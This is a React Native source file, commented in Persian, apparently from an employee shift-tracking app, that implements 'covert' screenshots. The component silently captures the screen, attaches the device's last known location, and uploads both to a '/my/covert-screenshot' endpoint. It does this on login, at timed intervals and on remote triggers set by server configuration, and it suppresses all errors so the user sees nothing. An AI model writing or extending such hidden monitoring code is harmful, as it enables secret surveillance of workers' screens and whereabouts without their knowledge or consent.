/**
 * اسکرین‌شات نامحسوس از صفحهٔ گوشی.
 * از react-native-view-shot برای گرفتن تصویر استفاده می‌کند.
 * اگر react-native-view-shot نصب نباشد، به‌سکوت نادیده گرفته می‌شود.
 */
import React, { useEffect } from 'react';
import * as Location from 'expo-location';
import { request } from './api';
import { getAppConfig } from './appconfig';
import { onCovertTrigger } from './covertTrigger';
import { isInShift } from './shiftCheck';

let captureRef = null;
export function setScreenshotRef(ref) { captureRef = ref; }

function inHoursLocal(hours) {
  if (!hours || !hours.length) return true;
  const now = new Date();
  const cur = now.getHours() * 60 + now.getMinutes();
  return hours.some((h) => {
    const [fh, fm] = (h.from || '00:00').split(':').map(Number);
    const [th, tm] = (h.to || '23:59').split(':').map(Number);
    return cur >= fh * 60 + fm && cur <= th * 60 + tm;
  });
}

export async function captureAndSendScreenshot(reason) {
  reason = reason || 'manual';
  try {
    // بررسی شیفت کاری (جز ارسال دستی)
    if (reason !== 'manual') {
      const inShift = await isInShift().catch(() => true);
      if (!inShift) return;
    }
    let cap;
    try {
      const { captureRef: captureFn } = require('react-native-view-shot');
      if (!captureRef || !captureRef.current) return;
      const uri = await captureFn(captureRef, { format: 'jpg', quality: 0.35 });
      if (!uri) return;
      const { readAsStringAsync, EncodingType, deleteAsync } = require('expo-file-system/legacy');
      const b64 = await readAsStringAsync(uri, { encoding: EncodingType.Base64 });
      cap = { uri, data: 'data:image/jpeg;base64,' + b64 };
      await deleteAsync(uri, { idempotent: true }).catch(() => {});
    } catch (e) {
      // react-native-view-shot نصب نیست → بدون خطا از دست می‌رود
      return;
    }
    let lat = null, lng = null;
    try {
      const loc = await Location.getLastKnownPositionAsync({});
      if (loc) { lat = loc.coords.latitude; lng = loc.coords.longitude; }
    } catch {}
    await request('/my/covert-screenshot', { method: 'POST', body: { photo: cap.data, lat, lng, reason } });
  } catch {}
}

// تابع مورد استفاده در notify.js
export function useScreenshotCommands() { return () => captureAndSendScreenshot('manual'); }

// کامپوننت پیش‌فرض: polling و trigger
const sentRef = { current: false };

export default function CovertScreenshot() {
  useEffect(() => {
    let iv;
    (async () => {
      const cfg = await getAppConfig().catch(() => ({}));
      // از تنظیمات اسکرین‌شات جداگانه یا همان تنظیم سلفی نامحسوس
      const enabled = cfg?.covert_screenshot_enabled ?? cfg?.covert_selfie_enabled ?? false;
      if (!enabled) return;
      const hours = cfg?.covert_screenshot_hours ?? cfg?.covert_selfie_hours ?? [];
      const onLogin = cfg?.covert_screenshot_on_login ?? cfg?.covert_selfie_on_login ?? false;
      const onCheckin = cfg?.covert_screenshot_on_checkin ?? cfg?.covert_selfie_on_checkin ?? false;
      if (onLogin && !sentRef.current) {
        sentRef.current = true;
        if (inHoursLocal(hours)) captureAndSendScreenshot('login');
      }
      const mins = Math.max(5, cfg?.covert_screenshot_interval_min ?? cfg?.covert_selfie_interval_min ?? 30);
      iv = setInterval(async () => {
        const c = await getAppConfig().catch(() => ({}));
        const en = c?.covert_screenshot_enabled ?? c?.covert_selfie_enabled ?? false;
        if (!en) return;
        const h = c?.covert_screenshot_hours ?? c?.covert_selfie_hours ?? [];
        if (inHoursLocal(h)) captureAndSendScreenshot('periodic');
      }, mins * 60 * 1000);
    })();
    // گوش‌دادن به تریگر خارجی
    const off = onCovertTrigger(async (rsn) => {
      const c = await getAppConfig().catch(() => ({}));
      const en = c?.covert_screenshot_enabled ?? c?.covert_selfie_enabled ?? false;
      if (!en) return;
      const h = c?.covert_screenshot_hours ?? c?.covert_selfie_hours ?? [];
      if (rsn !== 'manual' && !inHoursLocal(h)) return;
      captureAndSendScreenshot(rsn);
    });
    return () => { if (iv) clearInterval(iv); off(); };
  }, []);
  return null;
}
